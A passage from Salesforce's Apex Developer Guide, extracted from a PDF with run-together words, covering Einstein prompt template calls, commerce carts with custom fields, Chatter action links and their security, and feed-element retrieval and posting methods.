Using Salesforce Features with ApexApex Developer Guide

Resolve a Field Generation Prompt Template
// Createinput
ConnectApi.EinsteinPromptTemplateGenerationsInputpromptGenerationsInput= new
ConnectApi.EinsteinPromptTemplateGenerationsInput();
promptGenerationsInput.isPreview= false;
// Buildinputmap
Map<String,ConnectApi.WrappedValue>valueMap= new Map<String,ConnectApi.WrappedValue>();
Map<String,String>relatedEntityRecordIdMap= new Map<String,String>();
relatedEntityRecordIdMap.put('id','001xx000003H9cuAAC');
ConnectApi.WrappedValuerelatedEntityWrappedValue= new ConnectApi.WrappedValue();
relatedEntityWrappedValue.value= relatedEntityRecordIdMap;
valueMap.put('Input:Account',relatedEntityWrappedValue);
promptGenerationsInput.inputParams= valueMap;
// Set additionalconfigurationvalues
promptGenerationsInput.additionalConfig= new ConnectApi.EinsteinLlmAdditionalConfigInput();
promptGenerationsInput.additionalConfig.applicationName=
'PromptTemplateGenerationsInvocable';
// Callthe service
ConnectApi.EinsteinPromptTemplateGenerationsRepresentationgenerationsOutput=
ConnectApi.EinsteinLLM.generateMessagesForPromptTemplate('0hfxx0000000KRlAAM',
promptGenerationsInput);
// Consumeresponse
System.debug('PromptTesting:' + generationsOutput.prompt);
Resolve a Summary Prompt Template
// Createinput
ConnectApi.EinsteinPromptTemplateGenerationsInputpromptGenerationsInput= new
ConnectApi.EinsteinPromptTemplateGenerationsInput();
promptGenerationsInput.isPreview= false;
// Buildinputmap
Map<String,ConnectApi.WrappedValue>valueMap= new Map<String,ConnectApi.WrappedValue>();
Map<String,String>recipientEntityRecordIdMap= new Map<String,String>();
recipientEntityRecordIdMap.put('id','00Qxx000002ToPvEAK');
ConnectApi.WrappedValuerecipientEntityWrappedValue= new ConnectApi.WrappedValue();
recipientEntityWrappedValue.value= recipientEntityRecordIdMap;
valueMap.put('Input:Account',recipientEntityWrappedValue);
promptGenerationsInput.inputParams= valueMap;
// Set additionalconfigurationvalues
432
Using Salesforce Features with ApexApex Developer Guide

promptGenerationsInput.additionalConfig= new ConnectApi.EinsteinLlmAdditionalConfigInput();
promptGenerationsInput.additionalConfig.applicationName=
'PromptTemplateGenerationsInvocable';
// Callthe service
ConnectApi.EinsteinPromptTemplateGenerationsRepresentationgenerationsOutput=
ConnectApi.EinsteinLLM.generateMessagesForPromptTemplate('0hfxx0000000KUzAAM',
promptGenerationsInput);
// Consumeresponse
System.debug('PromptTesting:' + generationsOutput.prompt);
Create a Cart and Cart Item with Custom Fields in a Commerce Store
Create a cart with a cart item using custom fields for a buyer or guest user in your Commerce store.
Custom fields are optional and must be previously defined for the WebCart and CartItem sObjects. See Create Custom Fields. Field-level
security rules from the shopper profile are applied to the WebCart and CartItem custom fields. The rules are applied for registered
shoppers and for the guest shopper profile.
To create a cart with custom fields, call createCart(webstoreId,cartInput). Specify your custom fields using the
customFields property of cartInput. The type for customFields is List<SObject>, where the sObject is a WebCart.
Then, to add an item to the cart, call addItemToCart(webstoreId,effectiveAccountId,activeCartOrId,
cartItemInput,currencyIsoCode). You can specify custom fields using the customFields property of
cartItemInput. Again, the type of customFields is List<SObject>, but the sObject must be a CartItem.
In this scenario we assume that further customization sets a custom field within the Cart Calculate API flow onto the cart item for further
use.
ID webStoreId= '0ZEOL000000063r4AA';
ID accountId= '001OL000002LC0qYAG';
ID productId= '01tOL000000ETzuYAG';
List<SObject>webCartList= new List<SObject>();
WebCartwebCart= new WebCart();
webCart.webCartCustomTextField__c= 'webCartCustomFieldValue';
webCartList.add(webCart);
finalConnectApi.CartInputcartInput= new ConnectApi.CartInput();
cartInput.effectiveAccountId= accountId;
cartInput.name= 'CartWithCustomFields';
cartInput.customFields= webCartList;
// createa cart
ConnectApi.CartSummarycartSummary= ConnectApi.CommerceCart.createCart(webStoreId,
cartInput);
ID cartId= cartSummary.cartId;
// Given
List<SObject>cartItemList= new List<SObject>();
CartItemcartItem= new CartItem();
cartItem.cartItemCustomNumberField__c= 12.34;
cartItemList.add(cartItem);
433
Using Salesforce Features with ApexApex Developer Guide

finalConnectApi.CartItemInputinput= new ConnectApi.CartItemInput();
input.productId= productId;
input.quantity= '2';
input.type= ConnectApi.CartItemType.Product;
input.customFields= cartItemList;
// add an itemto the previouslycreatedcart
ConnectApi.CartItemitemResult= ConnectApi.CommerceCart.addItemToCart(webStoreId,
accountId,cartId,input,'USD');
// responsecontainsall (accessible)customfieldsfor whichdatawas set
CartItemcartItemResult= (CartItem)itemResult.customFields[0];
// the valuefromrequest(if not changedduringflow)
DoublevalueFromRequest= cartItemResult.cartItemCustomNumberField__c;
// an additionalcustomizationvalue,e.g.set by the cartcalculationflow
StringvalueForCustomization= cartItemResult.additionalCustomField__c;
Connect in Apex Features
This topic describes which classes and methods to use to work with common Connect in Apex features.
You can also go directly to the ConnectApi Namespace reference content.
Working with Action Links
An action link is a button on a feed element. Clicking an action link can take a user to a Web page, initiate a file download, or invoke
an API call to Salesforce or to an external server. An action link includes a URL and an HTTP method, and can include a request body
and header information, such as an OAuth token for authentication. Use action links to integrate Salesforce and third-party services
into the feed so that users can drive productivity and accelerate innovation.
Working with Feeds and Feed Elements
The Chatter feed is a container of feed elements. The abstract class ConnectApi.FeedElement is a parent class to the
ConnectApi.FeedItem class, representing feed posts, and the ConnectApi.GenericFeedElement class, representing
bundles and recommendations in the feed.
Accessing ConnectApi Data in Experience Cloud Sites
Many ConnectApi methods work within the context of a single Experience Cloud site.
Methods Available to Experience Cloud Guest Users
If your Experience Cloud site allows access without logging in, guest users have access to many Apex methods. These methods
return information the guest user has access to.
Supported Validations for DBT Segments
When creating or updating a segment, the ConnectApi.CdpSegmentInput class is subject to some SQL validations.
Working with Action Links
An action link is a button on a feed element. Clicking an action link can take a user to a Web page, initiate a file download, or invoke an
API call to Salesforce or to an external server. An action link includes a URL and an HTTP method, and can include a request body and
header information, such as an OAuth token for authentication. Use action links to integrate Salesforce and third-party services into the
feed so that users can drive productivity and accelerate innovation.
434
Using Salesforce Features with ApexApex Developer Guide

Workflow
This feed item contains one action link group with one visible action link, Join.
The workflow to create and post action links with a feed element:
1.(Optional) Create an action link template.
2.Call ConnectApi.ActionLinks.createActionLinkGroupDefinition(communityId,actionLinkGroup)
to define an action link group that contains at least one action link.
3.Call ConnectApi.ChatterFeeds.postFeedElement(communityId,feedElement) to post a feed element
and associate the action link with it.
Use these methods to work with action links.
TaskConnectApi Method
Create an action link group definition. To associate an action link
group with a feed element, first create an action link group
ActionLinks.createActionLinkGroupDefinition
(communityId,actionLinkGroup)
ActionLinks.deleteActionLinkGroupDefinition(communityId,
actionLinkGroupId)
definition. Then post a feed element with an associated actions
capability.
ActionLinks.getActionLinkGroupDefinition(communityId,
actionLinkGroupId)
Post a feed element with an associated actions capability. Associate
up to 10 action link groups with a feed element.
ChatterFeeds.postFeedElement(communityId,
feedElement)
Get information about an action link, including state for the context
user.
ActionLinks.getActionLink(communityId,
actionLinkId)
Get information about an action link group including state for the
context user.
ActionLinks.getActionLinkGroup(communityId,
actionLinkGroupId)
435
Using Salesforce Features with ApexApex Developer Guide

TaskConnectApi Method
Get diagnostic information returned when an action link executes.
Diagnostic information is given only for users who can access the
action link.
ActionLinks.getActionLinkDiagnosticInfo(communityId,
actionLinkId)
Get the feed elements from a specified feed type. If a feed element
has action links associated with it, the action links data is returned
in the feed element’s associated actions capability.
ChatterFeeds.getFeedElementsFromFeed()
Action Links Overview, Authentication, and Security
Learn about Apex action links security, authentication, labels, and errors.
Action Links Use Case
Use action links to integrate Salesforce and third-party services with a feed. An action link can make an HTTP request to a Salesforce
or third-party API. An action link can also download a file or open a web page. This topic contains an example use case.
SEE ALSO:
Define an Action Link and Post with a Feed Element
Define an Action Link in a Template and Post with a Feed Element
Action Links Overview, Authentication, and Security
Learn about Apex action links security, authentication, labels, and errors.
Workflow
This feed item contains one action link group with one visible action link, Join.
The workflow to create and post action links with a feed element:
1.(Optional) Create an action link template.
436
Using Salesforce Features with ApexApex Developer Guide

2.Call ConnectApi.ActionLinks.createActionLinkGroupDefinition(communityId,actionLinkGroup)
to define an action link group that contains at least one action link.
3.Call ConnectApi.ChatterFeeds.postFeedElement(communityId,feedElement) to post a feed element
and associate the action link with it.
Action Link Templates
Create action link templates in Setup to instantiate action link groups with common properties. You can package templates and distribute
them to other Salesforce orgs.
Specify binding variables in the template and set the values of the variables when you instantiate the action link group. For example,
use a binding variable for the API version number, a user ID, or an OAuth token.
You can also specify context variables in the templates. When a user executes the action link, Salesforce provides values for these variables,
such as who executed the link and in which organization.
To instantiate the action link group, call the
ConnectApi.ActionLinks.createActionLinkGroupDefinition(communityId,actionLinkGroup)
method. Specify the template ID and the values for any binding variables defined in the template.
See Design Action Link Templates.
Type of Action Links
Specify the action link type in the actionType property when you define an action link.
There are four types of action links:
•
Api—The action link calls a synchronous API at the action URL. Salesforce sets the status to SuccessfulStatus or
FailedStatus based on the HTTP status code returned by your server.
•
ApiAsync—The action link calls an asynchronous API at the action URL. The action remains in a PendingStatus state until
a third party makes a request to /connect/action-links/actionLinkId to set the status to SuccessfulStatus
or FailedStatus when the asynchronous operation is complete.
•
Download—The action link downloads a file from the action URL.
•
Ui—The action link takes the user to a web page at the action URL.
Authentication
When you define an action link, specify a URL (actionUrl) and the HTTP headers (headers) required to make a request to that
URL.
If an external resource requires authentication, include the information wherever the resource requires.
If a Salesforce resource requires authentication, you can include OAuth information in the HTTP headers or you can include a bearer
token in the URL.
Salesforce automatically authenticates these resources.
•
Relative URLs in templates
•
Relative URLs beginning with /services/apexrest when the action link group is instantiated from Apex
Don’t use these resources for sensitive operations.
437
Using Salesforce Features with ApexApex Developer Guide

Security
HTTPS
The action URL in an action link must begin with https:// or be a relative URL that matches one of the rules in the previous
Authentication section.
Encryption
API details are stored with encryption, and obfuscated for clients.
The actionURL, headers, and requestBody data for action links that are not instantiated from a template are encrypted
with the organization’s encryption key. The ActionURL, HTTPHeaders, and HTTPRequestBody for an action link
template are not encrypted. The binding values used when instantiating an action link group from a template are encrypted with
the organization’s encryption key.
Action Link Templates
Only users with Customize Application user permission can create, edit, delete, and package action link templates in Setup.
Don’t store sensitive information in templates. Use binding variables to add sensitive information when you instantiate the action
link group. After the action link group is instantiated, the values are stored in an encrypted format. See Define Binding Variables in
Design Action Link Templates.
Connected Apps
When creating action links via a connected app, it's a good idea to use a connected app with a consumer key that never leaves your
control. The connected app is used for server-to-server communication and is not compiled into mobile apps that could be decompiled.
Expiration Date
When you define an action link group, specify an expiration date (expirationDate). After that date, the action links in the group
can’t be executed and disappear from the feed. If your action link group definition includes an OAuth token, set the group’s expiration
date to the same value as the expiration date of the OAuth token.
Action link templates use a slightly different mechanism for excluding a user. See Set the Action Link Group Expiration Time in Design
Action Link Templates.
Exclude a User or Specify a User
Use the excludeUserId property of the action link definition input to exclude a single user from executing an action.
Use the userId property of the action link definition input to specify the ID of a user who alone can execute the action. If you
don’t specify a userId property or if you pass null, any user can execute the action. You can’t specify both excludeUserId
and userId for an action link
Action link templates use a slightly different mechanism for excluding a user. See Set Who Can See the Action Link in Design Action
Link Templates.
Read, Modify, or Delete an Action Link Group Definition
There are two views of an action link and an action link group: the definition, and the context user’s view. The definition includes
potentially sensitive information, such as authentication information. The context user’s view is filtered by visibility options and the
values reflect the state of the context user.
Action link group definitions can contain sensitive information (such as OAuth tokens). For this reason, to read, modify, or delete a
definition, the user must have created the definition or have View All Data permission. In addition, in Connect REST API, the request
must be made via the same connected app that created the definition. In Apex, the call must be made from the same namespace
that created the definition.
Context Variables
Use context variables to pass information about the user who executed the action link and the context in which it was invoked into the
HTTP request made by invoking an action link. You can use context variables in the actionUrl, headers, and requestBody
properties of the Action Link Definition Input request body or ConnectApi.ActionLinkDefinitionInput object. You can
438
Using Salesforce Features with ApexApex Developer Guide

also use context variables in the ActionURL, HTTPRequestBody, and HTTPHeaders fields of action link templates. You
can edit these fields, including adding and removing context variables, after a template is published.
The context variables are:
DescriptionContext Variable
The ID of the action link the user executed.{!actionLinkId}
The ID of the action link group containing the action link the user
executed.
{!actionLinkGroupId}
The ID of the site in which the user executed the action link. The
value for your internal org is the empty key
"000000000000000000".
{!communityId}
The URL of the site in which the user executed the action link. The
value for your internal org is empty string "".
{!communityUrl}
The ID of the org in which the user executed the action link.{!orgId}
The ID of the user that executed the action link.{!userId}
Versioning
To avoid issues due to upgrades or changing functionality in your API, we recommend using versioning when defining action links. For
example, the actionUrl property in the ConnectApi.ActionLinkDefinitionInputlooks like
https://www.example.com/api/v1/exampleResource.
You can use templates to change the values of the actionUrl, headers, or requestBody properties, even after a template is
distributed in a package. Let’s say you release a new API version that requires new inputs. An admin can change the inputs in the action
link template in Setup and even action links already associated with a feed element use the new inputs. However, you can’t add new
binding variables to a published action link template.
If your API isn’t versioned, you can use the expirationDate property of the
ConnectApi.ActionLinkGroupDefinitionInput to avoid issues due to upgrades or changing functionality in your API.
See Set the Action Link Group Expiration Time in Design Action Link Templates.
Errors
Use the Action Link Diagnostic Information method
(ConnectApi.ActionLinks.getActionLinkDiagnosticInfo(communityId,actionLinkId)) to return
status codes and errors from executing Api action links. Diagnostic info is given only for users who can access the action link.
Localized Labels
Action links use a predefined set of localized labels specified in the labelKey property of the
ConnectApi.ActionLinkDefinitionInput request body and the Label field of an action link template.
For a list of labels, see Actions Links Labels.
439
Using Salesforce Features with ApexApex Developer Guide

Note:  If none of the label key values make sense for your action link, specify a custom label in the Label field of an action link
template and set LabelKey to None. However, custom labels aren’t localized.
SEE ALSO:
Define an Action Link and Post with a Feed Element
Define an Action Link in a Template and Post with a Feed Element
Define an Action Link and Post with a Feed Element
Define an Action Link in a Template and Post with a Feed Element
Action Links Use Case
Use action links to integrate Salesforce and third-party services with a feed. An action link can make an HTTP request to a Salesforce or
third-party API. An action link can also download a file or open a web page. This topic contains an example use case.
Start a Video Chat from the Feed
Suppose that you work as a Salesforce developer for a company that has a Salesforce org and an account with a fictional company called
“VideoChat.” Users have been saying they want to do more from their mobile devices. You’re asked to create an app that lets users create
and join video chats directly from their mobile device.
When a user opens the VideoChat app in Salesforce, they’re asked to name the video chat room and invite either a group or individual
users to the video chat room. When the user clicks OK, the VideoChat app launches the video chat room and posts a feed item to the
selected group or users asking them to Please join the video chat by clicking an action link labeled Join. When an invitee clicks Join,
the action link opens a web page containing the video chat room.
As a developer thinking about how to create the action link URL, you come up with these requirements:
1.When a user clicks Join, the action link URL has to open the video chat room they were invited to.
2.The action link URL has to tell the video chat room who’s joining.
To dynamically create the action link URLs, you create an action link template in Setup.
440
Using Salesforce Features with ApexApex Developer Guide

For the first requirement, you create a {!Bindings.roomId} binding variable in the ActionURL template field. When the
user clicks OK to create the video chat room, your Apex code generates a unique room ID. The Apex code uses that unique room ID as
the binding variable value when it instantiates the action link group, associates it with the feed item, and posts the feed item.
For the second requirement, the action link must include the user ID. Action links support a predefined set of context variables. When
an action link is invoked, Salesforce substitutes the variables with values. Context variables include information about who clicked the
action link and in what context it was invoked. You decide to include a {!userId} context variable in the ActionURL so that
when a user clicks the action link in the feed, Salesforce substitutes the user’s ID and the video chat room knows who’s entering.
This is the action link template for the Join action link.
Every action link must be associated with an action link group. The group defines properties shared by all the action links associated
with it. Even if you’re using a single action link (as in this example) it must be associated with a group. The first field of the action link
template is ActionLinkGroupTemplate, which in this case is Video Chat, which is the action link group template the
action link template is associated with.
441
Using Salesforce Features with ApexApex Developer Guide

.
Working with Feeds and Feed Elements
The Chatter feed is a container of feed elements. The abstract class ConnectApi.FeedElement is a parent class to the
ConnectApi.FeedItem class, representing feed posts, and the ConnectApi.GenericFeedElement class, representing
bundles and recommendations in the feed.
Note:  Salesforce Help refers to feed items as posts and bundles as bundled posts.
Capabilities
As part of the effort to diversify the feed, pieces of functionality found in feed elements have been broken out into capabilities. Capabilities
provide a consistent way to interact with the feed. Don’t inspect the feed element type to determine which functionality is available for
a feed element. Inspect the capability, which tells you explicitly what’s available. Check for the presence of a capability to determine
what a client can do to a feed element.
The ConnectApi.FeedElement.capabilities property holds a set of capabilities.
A capability includes both an indication that a feature is possible and data associated with that feature. If a capability property exists on
a feed element, that capability is available, even if there isn’t any data associated with the capability yet. For example, if the
chatterLikes capability property exists on a feed element, the context user can like that feed element. If the capability property
doesn’t exist on a feed element, it isn’t possible to like that feed element.
When posting a feed element, specify its characteristics in the ConnectApi.FeedElementInput.capabilities property.
How the Salesforce UI Displays Feed Items
A client can use the ConnectApi.FeedElement.capabilities property to determine what it can do with a feed element
and how to render the feed element. For all feed element subclasses other than ConnectApi.FeedItem, the client doesn’t have
to know the subclass type. Instead, the client can look at the capabilities. Feed items do have capabilities, but they also have a few
properties, such as actor, that aren’t exposed as capabilities. For this reason, clients must handle feed items a bit differently than other
feed elements.
The Salesforce UI uses one layout to display every feed item. This single layout gives customers a consistent view of feed items and gives
developers an easy way to create UI. The layout always contains the same pieces and the pieces are always in the same position. Only
the content of the layout pieces changes.
442
Using Salesforce Features with ApexApex Developer Guide

The feed item (ConnectApi.FeedItem) layout elements are:
1.Actor (ConnectApi.FeedItem.actor)—A photo or icon of the creator of the feed item. (You can override the creator at
the feed item type level. For example, the dashboard snapshot feed item type shows the dashboard as the creator.)
2.Header (ConnectApi.FeedElement.header)—Context for the feed item. The same feed item can have a different header
depending on who posted it and where it was posted. For example, Ted posted this feed item to a group.
Timestamp (ConnectApi.FeedElement.relativeCreatedDate)—The date and time when the feed item was posted.
If the feed item is less than two days old, the date and time are formatted as a relative, localized string, such as “17m ago”. Otherwise,
the date and time are formatted as an absolute, localized string.
3.Body (ConnectApi.FeedElement.body)—All feed items have a body. The body can be null, which is the case when
the user doesn’t provide text for the feed item. Because the body can be null, you can’t use it as the default case for rendering
text. Instead, use the ConnectApi.FeedElement.header.text property, which always contains a value.
4.Auxiliary Body (ConnectApi.FeedElement.capabilities)—The visualization of the capabilities. See Capabilities.
How the Salesforce Displays Feed Elements Other Than Feed Items
A client can use the ConnectApi.FeedElement.capabilities property to determine what it can do with a feed element
and how to render the feed element. This section uses bundles as an example of how to render a feed element, but these properties
are available for every feed element. Capabilities allow you to handle all content in the feed consistently.
Note:  Bundled posts contain feed-tracked changes and are in record feeds only.
To give customers a clean, organized feed, Salesforce aggregates feed-tracked changes into a bundle. To see individual feed elements,
click the bundle.
A bundle is a ConnectApi.GenericFeedElement object (which is a concrete subclass of ConnectApi.FeedElement)
with a ConnectApi.BundleCapability. The bundle layout elements are:
•
Header (ConnectApi.FeedElement.header)—For feed-tracked change bundles, this text is “UserName updated this
record.”
•
Timestamp (ConnectApi.FeedElement.relativeCreatedDate)—The date and time when the feed item was posted.
If the feed item is less than two days old, the date and time are formatted as a relative, localized string, such as “17m ago”. Otherwise,
the date and time are formatted as an absolute, localized string.
•
Auxiliary Body (ConnectApi.FeedElement.capabilities.bundle.changes)—The bundle displays the
fieldName and the oldValue and newValue properties for the first two feed-tracked changes in the bundle. If there are
more than two feed-tracked changes, the bundle displays a “Show All Updates” link.
443
Using Salesforce Features with ApexApex Developer Guide

Feed Element Visibility
The feed elements a user sees depend on how the administrator has configured feed tracking, sharing rules, and field-level security. For
example, if a user doesn’t have access to a record, they don’t see updates for that record. If a user can see the parent of the feed element,
the user can see the feed element. Typically, a user sees feed updates for:
•
Feed elements that @mention the user (if the user can access the feed element’s parent)
•
Feed elements that @mention groups the user is a member of
•
Record field changes on records whose parent is a record the user can see, including User, Group, and File records
•
Feed elements posted to the user
•
Feed elements posted to groups that the user owns or is a member of
•
Feed elements for standard and custom records, for example, tasks, events, leads, accounts, files
Feed Types
There are many types of feeds. Each feed type defines a collection of feed elements.
Important:  The collection of feed elements can change between releases.
All feed types except Favorites are exposed in the ConnectApi.FeedType enum and passed to one of the
ConnectApi.ChatterFeeds.getFeedElementsFromFeed methods. This example gets the feed elements from the
context user’s news feed and topics feed.
ConnectApi.FeedElementPagenewsFeedElementPage=
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(null,
ConnectApi.FeedType.News,'me');
ConnectApi.FeedElementPagetopicsFeedElementPage=
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(null,
ConnectApi.FeedType.Topics,'0TOD00000000cld');
To get a filter feed, call one of the ConnectApi.ChatterFeeds.getFeedElementsFromFilterFeed methods. To get
a favorites feed, call one of the ConnectApi.ChatterFavorites.getFeedElements methods.
The feed types and their descriptions are:
•
Bookmarks—Contains all feed items saved as bookmarks by the context user.
•
Company—Contains all feed items except feed items of type TrackedChange. To see the feed item, the user must have sharing
access to its parent.
•
DirectMessageModeration—Contains all direct messages that are flagged for moderation. The Direct Message Moderation
feed is available only to users with Moderate Experiences Chatter Messages permissions.
•
DirectMessages—Contains all feed items of the context user’s direct messages.
•
Draft—Contains all the feed items that the context user drafted.
•
Files—Contains all feed items that contain files posted by people or groups that the context user follows.
•
Filter—Contains the news feed filtered to contain feed items whose parent is a specified object type.
•
Groups—Contains all feed items from all groups the context user either owns or is a member of.
•
Home—Contains all feed items associated with any managed topic in an Experience Cloud site.
•
Landing—Contains all feed items that best drive user engagement when the feed is requested. Allows clients to avoid an empty
feed when there aren’t many personalized feed items.
•
Moderation—Contains all feed items that are flagged for moderation, except direct messages. The moderation feed is available
only to users with Moderate Experiences Feeds permissions.
444
Using Salesforce Features with ApexApex Developer Guide

•
Mute—Contains all feed items that the context user muted.
•
News—Contains all updates for people the context user follows, groups the user is a member of, and files and records the user is
following. Contains all updates for records whose parent is the context user.
•
PendingReview—Contains all feed items and comments that are pending review.
•
People—Contains all feed items posted by all people the context user follows.
•
Record—Contains all feed items whose parent is a specified record, which could be a group, user, object, file, or any other standard
or custom object. When the record is a group, the feed also contains feed items that mention the group. When the record is a user,
the feed contains only feed items on that user. You can get another user’s record feed.
•
Streams—Contains all feed items for any combination of up to 25 feed-enabled entities that the context user subscribes to in a
stream. Examples of feed-enabled entities include people, groups, and records,
•
To—Contains all feed items with mentions of the context user. Contains feed items the context user commented on and feed items
created by the context user that are commented on.
•
Topics—Contains all feed items that include the specified topic.
•
UserProfile—Contains feed items created when a user changes records that can be tracked in a feed. Contains feed items
whose parent is the user and feed items that @mention the user. This feed is different than the news feed, which returns more feed
items, including group updates. You can get another user’s user profile feed.
•
Favorites—Contains favorites saved by the context user. Favorites are feed searches, list views, and topics.
Post a Feed Item Using postFeedElement
Tip:  The postFeedElement methods are the simplest, most efficient way to post feed items because, unlike the
postFeedItem methods, they don’t require you to pass a feed type. Feed items are the only feed element type you can post.
Use these methods to post feed items.
postFeedElement(communityId,subjectId,feedElementType,text)
Post a plain-text feed element.
postFeedElement(communityId,feedElement,feedElementFileUpload) (version 35.0 and earlier)
Post a rich-text feed element. Include mentions and hashtag topics, attach a file to a feed element, and associate action link groups
with a feed element. You can also use this method to share a feed element and add a comment.
postFeedElement(communityId,feedElement) (version 36.0 and later)
Post a rich-text feed element. Include mentions and hashtag topics, attach already uploaded files to a feed element, and associate
action link groups with a feed element. You can also use this method to share a feed element and add a comment.
When you post a feed item, you create a child of a standard or custom object. Specify the parent object in the subjectId parameter
or in the subjectId property of the ConnectApi.FeedElementInput object you pass in the feedElement parameter.
The value of the subjectId parameter determines the feeds in which the feed item is displayed. The parent property in the
returned ConnectApi.FeedItem object contains information about the parent object.
Use these methods to complete these tasks.
Post to yourself
This code posts a feed item to the context user. The subjectId specifies me, which is an alias for the context user’s ID. It could
also specify the context user’s ID.
ConnectApi.FeedElementfeedElement= ConnectApi.ChatterFeeds.postFeedElement(null, 'me',
ConnectApi.FeedElementType.FeedItem,'Workingfromhometoday.');
The parent property of the newly posted feed item contains the ConnectApi.UserSummary of the context user.
445
Using Salesforce Features with ApexApex Developer Guide

Post to another user
This code posts a feed item to a user other than the context user. The subjectId specifies the user ID of the target user.
ConnectApi.FeedElementfeedElement= ConnectApi.ChatterFeeds.postFeedElement(null,
'005D00000016Qxp', ConnectApi.FeedElementType.FeedItem,'Kevin,do you haveinformation
aboutthe new categories?');
The parent property of the newly posted feed item contains the ConnectApi.UserSummary of the target user.
Post to a group
This code posts a feed item to a group. The subjectId specifies the group ID.
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.MentionSegmentInputmentionSegmentInput= new ConnectApi.MentionSegmentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
mentionSegmentInput.id= '005RR000000Dme9';
messageBodyInput.messageSegments.add(mentionSegmentInput);
textSegmentInput.text= 'Couldyou takea look?';
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
feedItemInput.feedElementType= ConnectApi.FeedElementType.FeedItem;
feedItemInput.subjectId= '0F9RR0000004CPw';
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
The parent property of the newly posted feed item contains the ConnectApi.ChatterGroupSummary of the specified
group.
Post to a record (such as a file or an account)
This code posts a feed item to a record and mentions a group. The subjectId specifies the record ID.
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.MentionSegmentInputmentionSegmentInput= new ConnectApi.MentionSegmentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Doesanyoneknowanyonewithcontactshere?';
messageBodyInput.messageSegments.add(textSegmentInput);
// Mentiona group.
mentionSegmentInput.id= '0F9D00000000oOT';
messageBodyInput.messageSegments.add(mentionSegmentInput);
feedItemInput.body= messageBodyInput;
feedItemInput.feedElementType= ConnectApi.FeedElementType.FeedItem;
// Use a recordID for the subjectID.
446
Using Salesforce Features with ApexApex Developer Guide

feedItemInput.subjectId= '001D000000JVwL9';
ConnectApi.FeedElementfeedElement= ConnectApi.ChatterFeeds.postFeedElement(null,
feedItemInput);
The parent property of the new feed item depends on the record type specified in subjectId. If the record type is File, the
parent is ConnectApi.FileSummary. If the record type is Group, the parent is ConnectApi.ChatterGroupSummary.
If the record type is User, the parent is ConnectApi.UserSummary. For all other record types, as in this example that uses an
Account, the parent is ConnectApi.RecordSummary.
Get Feed Elements from a Feed
Tip:  To return a feed that includes feed elements, call these methods. Feed element types include feed item, bundle, and
recommendation.
Getting feed items from a feed is similar, but not identical, for each feed type.
Get feed elements from the Company, DirectMessageModeration, DirectMessages, Home, Moderation, and
PendingReview feeds
To get the feed elements from these feeds, use these methods that don’t require a subjectId.
•
getFeedElementsFromFeed(communityId,feedType)
•
getFeedElementsFromFeed(communityId,feedType,pageParam,pageSize,sortParam)
•
getFeedElementsFromFeed(communityId,feedType,recentCommentCount,density,
pageParam,pageSize,sortParam)
•
getFeedElementsFromFeed(communityId,feedType,recentCommentCount,density,
pageParam,pageSize,sortParam,filter)
•
getFeedElementsFromFeed(communityId,feedType,recentCommentCount,density,
pageParam,pageSize,sortParam,filter,threadedCommentsCollapsed)
Get feed elements from the Favorites feed
To get the feed elements from the favorites feed, specify a favoriteId. For these feeds, the subjectId must be the ID of
the context user or the alias me.
•
getFeedElements(communityId,subjectId,favoriteId)
•
getFeedElements(communityId,subjectId,favoriteId,pageParam,pageSize,sortParam)
•
getFeedElements(communityId,subjectId,favoriteId,recentCommentCount,
elementsPerBundle,pageParam,pageSize,sortParam)
Get feed elements from the Filter feed
To get the feed elements from the filters feed, specify a keyPrefix. The keyPrefix indicates the object type and is the first
three characters of the object ID. The subjectId must be the ID of the context user or the alias me.
•
getFeedElementsFromFilterFeed(communityId,subjectId,keyPrefix)
•
getFeedElementsFromFilterFeed(communityId,subjectId,keyPrefix,pageParam,
pageSize,sortParam)
•
getFeedElementsFromFilterFeed(communityId,subjectId,keyPrefix,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam)
Get feed elements from the Bookmarks, Files, Groups, Mute, News, People, Record, Streams, To, Topics,
and UserProfile feeds
To get the feed elements from these feed types, specify a subject ID. If feedType is Record, subjectId can be any record
ID, including a group ID. If feedType is Streams, subjectId must be a stream ID. If feedType is Topics, subjectId
447
Using Salesforce Features with ApexApex Developer Guide

must be a topic ID. If feedType is UserProfile, subjectId can be any user ID. If the feedType is any other value,
subjectId must be the ID of the context user or the alias me.
•
getFeedElementsFromFeed(communityId,feedType,subjectId)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,pageParam,pageSize,
sortParam)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam,filter)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam,filter,threadedCommentsCollapsed)
Get feed elements from a Record feed
For subjectId, specify a record ID.
Tip:  The record can be a record of any type that supports feeds, including group. The feed on the group page in the Salesforce
UI is a record feed.
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam,showInternalOnly)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam,customFilter)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam,showInternalOnly)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam,showInternalOnly,
filter)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam,showInternalOnly,
customFilter)
•
